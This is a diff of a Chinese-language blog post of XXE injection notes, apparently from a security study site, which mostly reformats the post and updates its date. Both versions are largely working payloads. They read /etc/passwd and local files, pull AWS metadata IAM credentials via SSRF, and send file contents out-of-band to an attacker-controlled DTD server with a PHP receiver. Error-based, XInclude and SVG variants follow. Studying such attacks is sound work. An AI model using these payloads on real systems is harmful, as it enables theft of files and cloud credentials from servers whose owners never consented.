@@ -28,7 +28,7 @@
 <meta property="og:site_name" content="Voyage Memo">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-09-15T15:02:14.000Z">
-<meta property="article:modified_time" content="2026-09-15T15:12:48.816Z">
+<meta property="article:modified_time" content="2026-10-30T00:49:37.464Z">
 <meta property="article:author" content="智高">
 <meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
@@ -211,10 +211,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2026-09-15 23:02:14 / 修改时间：23:12:48" itemprop="dateCreated datePublished" datetime="2026-09-15T23:02:14+08:00">2026-09-15</time>
+              <time title="创建时间：2026-09-15 23:02:14" itemprop="dateCreated datePublished" datetime="2026-09-15T23:02:14+08:00">2026-09-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-10-30 08:49:37" itemprop="dateModified" datetime="2026-10-30T08:49:37+08:00">2026-10-30</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -282,95 +288,47 @@
 <p>-方案2-过滤用户提交的XML数据</p>
 <p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p>
 <h1 id="二、有回显利用"><a href="#二、有回显利用" class="headerlink" title="二、有回显利用"></a>二、有回显利用</h1><p>1、文件读取：</p>
-<?xml version="1.0"encoding="UTF-8"?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>
 
-<!DOCTYPE test[<!ENTITY xxe SYSTEM "file:///etc/passwd"><p>]&gt;</p>
-<p><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck></p>
+
+
 <p>2、SSRF&amp;配合元数据</p>
 <p>条件：存在XXE注入的云服务器应用</p>
-<?xml version="1.0"encoding="UTF-8"?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;&gt;]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;</span><br><span class="line">&amp;xxe;</span><br><span class="line">&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>
 
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"><p>]&gt;</p>
-<p><stockCheck><productId></p>
-<p>&xxe;</p>
-<p></productId><storeId>1</storeId></stockCheck></p>
+
+
 <p><font style="background-color:#81BBF8;"><a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</a> </font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">169.254.169.254</font><font style="background-color:#81BBF8;"> 是 </font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">AWS EC2 云实例的链路本地元数据服务地址（IMDSv1）</font><font style="background-color:#81BBF8;">，</font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">只能从 EC2 实例本机内部访问，公网无法直接访问</font><font style="background-color:#81BBF8;">腾讯云。这里利用xxe漏洞让服务器自动去访问这个地址，就会返回敏感内容，例如aksk。</font></p>
 <p>外部引用实体dtd：</p>
-<?xml version="1.0" ?>
-
-<!DOCTYPE test[
-
-<!ENTITY % file SYSTEM "http://xiaodi8.com/file.dtd">
-
-<p>%file;</p>
-<p>]&gt;</p>
-<p><user><username>&send;</username><password>xiaodi</password></user></p>
-<p>file.dtd</p>
-<!ENTITY send SYSTEM "file:///d:/x.txt">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;http://xiaodi8.com/file.dtd&quot;&gt;</span><br><span class="line">%file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br><span class="line">file.dtd</span><br><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///d:/x.txt&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 
 
 <h1 id="三、无回显利用"><a href="#三、无回显利用" class="headerlink" title="三、无回显利用"></a>三、无回显利用</h1><p>1、带外测试</p>
-<?xml version="1.0" ?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;http://xiaodi8.dnslog.cn&quot;&gt;</span><br><span class="line">%file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
 
-<!DOCTYPE test[
 
-<!ENTITY % file SYSTEM "http://xiaodi8.dnslog.cn">
 
-<p>%file;</p>
-<p>]&gt;</p>
-<p><user><username>&send;</username><password>xiaodi</password></user></p>
 <p>2、外部引用实体dtd配合带外</p>
-<?xml version="1.0"?>
-
-<!DOCTYPE ANY[
-
-<!ENTITY % file SYSTEM "file:///c:/c.txt">
-
-<!ENTITY % remote SYSTEM "http://www.xiaodi8.com/test.dtd">
-
-<p>%remote;</p>
-<p>%all;</p>
-<p><font style="background-color:#ED740C;">这里只调用了remote和all为什么没有调用file，我们分析一下内部dtd子集，首先是两个外部实体参数的定义，然后是实体参数remote和all的调用，remote调用会去访问<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/test.dtd%EF%BC%8Ctest.dtd%E7%9A%84%E5%86%85%E5%AE%B9%E4%B8%8B%E9%9D%A2%E5%86%99%E4%BA%86%EF%BC%8C%E7%84%B6%E5%90%8Etest.dtd%E7%9A%84%E5%86%85%E5%AE%B9%E4%BC%9A%E8%A2%AB%E5%B5%8C%E5%85%A5%E5%88%B0dtd%E5%86%85%E9%83%A8%E5%AD%90%E9%9B%86%E4%B8%AD%EF%BC%8C%E7%84%B6%E5%90%8E%E8%B0%83%E7%94%A8%E5%AE%9E%E4%BD%93%E5%8F%82%E6%95%B0all%EF%BC%8C%E5%88%9A%E5%88%9A%E5%B5%8C%E5%85%A5%E7%9A%84%E5%86%85%E5%AE%B9%E4%BC%9A%E8%A2%AB%E5%B1%95%E5%BC%80%EF%BC%8C%E5%9B%A0%E4%B8%BAfile%E5%AE%9E%E4%BD%93%E6%98%AF%E5%B5%8C%E5%85%A5%E5%88%B0all%E5%AE%9E%E4%BD%93%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%8C">http://www.xiaodi8.com/test.dtd，test.dtd的内容下面写了，然后test.dtd的内容会被嵌入到dtd内部子集中，然后调用实体参数all，刚刚嵌入的内容会被展开，因为file实体是嵌入到all实体的字符串中，</a> 等外层实体展开的时候，自动把里面的file一起展开。 </font> </p>
-<p>]&gt;</p>
-<p><user><username>&send;</username><password>xiaodi</password></user></p>
-<p>test.dtd：</p>
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://www.xiaodi8.com/get.php?file=%file;'><p>“&gt;</p>
-<p>get.php:</p>
-<?php
-
-$data=$_GET['file'];
-
-$myfile= fopen("file.txt", "w+");
-
-fwrite($myfile, $data);
-
-fclose($myfile);
-
-?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/c.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://www.xiaodi8.com/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">这里只调用了remote和all为什么没有调用file，我们分析一下内部dtd子集，首先是两个外部实体参</span><br><span class="line">数的定义，然后是实体参数remote和all的调用，remote调用会去访问http://www.xiaodi8.com/te</span><br><span class="line">st.dtd，test.dtd的内容下面写了，然后test.dtd的内容会被嵌入到dtd内部子集中，然后调用实体</span><br><span class="line">参数all，刚刚嵌入的内容会被展开，因为file实体是嵌入到all实体的字符串中， 等外层实体展开</span><br><span class="line">的时候，自动把里面的file一起展开。  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"></span><br><span class="line">test.dtd：</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://www.xiaodi8.com/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">get.php:</span><br><span class="line">&lt;?php</span><br><span class="line">$data=$_GET[&#x27;file&#x27;];</span><br><span class="line">$myfile= fopen(&quot;file.txt&quot;, &quot;w+&quot;);</span><br><span class="line">fwrite($myfile, $data);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">test.dtd-&gt;all-&gt;send-&gt;get.php?file=%file-&gt;file:///c:/c.txt</span><br><span class="line">http://www.xiaodi8.com/get.php?file=读取的内网数据</span><br></pre></td></tr></table></figure>
 
 
 
-<p>test.dtd-&gt;all-&gt;send-&gt;get.php?file&#x3D;%file-&gt;file:&#x2F;&#x2F;&#x2F;c:&#x2F;c.txt</p>
-<p><a target="_blank" rel="noopener" href="http://www.xiaodi8.com/get.php?file=%E8%AF%BB%E5%8F%96%E7%9A%84%E5%86%85%E7%BD%91%E6%95%B0%E6%8D%AE">http://www.xiaodi8.com/get.php?file=读取的内网数据</a></p>
+
+
 <p>3、外部引用实体dtd配合错误解析</p>
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br><span class="line">这里有疑问了为什么错误路径会把内容显示出来，因为system实体的逻辑是先把整个字符串拼接起来，实体展开完成之后，才去尝试访问这个路径&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;这一步就拿到内容了。</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0ab2006f03dce8a4803dfde101f300</span><br><span class="line">7d.exploit-server.net/exploit&quot;&gt; %xxe;]&gt;</span><br></pre></td></tr></table></figure>
 
-<!ENTITY % eval"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'><p>“&gt;</p>
-<p>%eval;</p>
-<p>%exfil;</p>
-<p><font style="background-color:#ED740C;">这里有疑问了为什么错误路径会把内容显示出来，因为system实体的逻辑是先把整个字符串拼接起来，实体展开完成之后，才去尝试访问这个路径<!ENTITY % file SYSTEM "file:///etc/passwd">这一步就拿到内容了。</font></p>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ab2006f03dce8a4803dfde101f3007d.exploit-server.net/exploit"><p> %xxe;]&gt;</p>
+
+
 <h1 id="四、升级拓展"><a href="#四、升级拓展" class="headerlink" title="四、升级拓展"></a>四、升级拓展</h1><p>1、xinclude利用</p>
 <p>一些应用程序接收客户端提交的数据，在服务器端将其嵌入到XML文档中，然后解析该文档，所以利用xinclude嵌套进去执行</p>
-<p><foo xmlns:xi="http://www.w3.org/2001/XInclude">&lt;xi:include parse&#x3D;”text”href&#x3D;”file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”&#x2F;&gt;</foo></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot;href=&quot;file:/</span><br><span class="line">//etc/passwd&quot;/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
 <p><font style="background-color:#ED740C;">之前我们都是xml整体发到服务器的，这里比如发送的内容是user&#x3D;1&amp;&amp;pass&#x3D;2这种，但是它发送到服务器可能是拼接成<user>1</user><pass>2</pass>,所以我们只能控制内容，xinclude就是专门嵌入在普通xml元素内使用的</font></p>
 <p>2、SVG图像解析（docx等）</p>
 <p>一些应用程序接收解析文件，可以使用基于XML的格式的例子有DOCX这样的办公文档格式和SVG这样的图像格式进行测试</p>
-<?xml version="1.0"standalone="yes"?>
-
-<!DOCTYPE test[<!ENTITY xxe SYSTEM "file:///etc/hostname"><p>]&gt;&lt;svg width&#x3D;”128px”height&#x3D;”128px”xmlns&#x3D;”<a target="_blank" rel="noopener" href="http://www.w3.org/2000/svg">http://www.w3.org/2000/svg</a>“ xmlns:xlink&#x3D;”<a target="_blank" rel="noopener" href="http://www.w3.org/1999/xlink%22version=%221.1%22%3E">http://www.w3.org/1999/xlink&quot;version=&quot;1.1&quot;&gt;</a>&lt;text font-size&#x3D;”16”x&#x3D;”0”y&#x3D;”16”&gt;&xxe;</text></p>
-</svg>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;]&gt;&lt;svg width=&quot;128px&quot;height</span><br><span class="line">=&quot;128px&quot;xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink</span><br><span class="line">&quot;version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot;x=&quot;0&quot;y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
 
 <p>3、见图</p>
 <p>基于XML的Web服务： SOAP、REST和RPC API这些接收和处理XML格式</p>
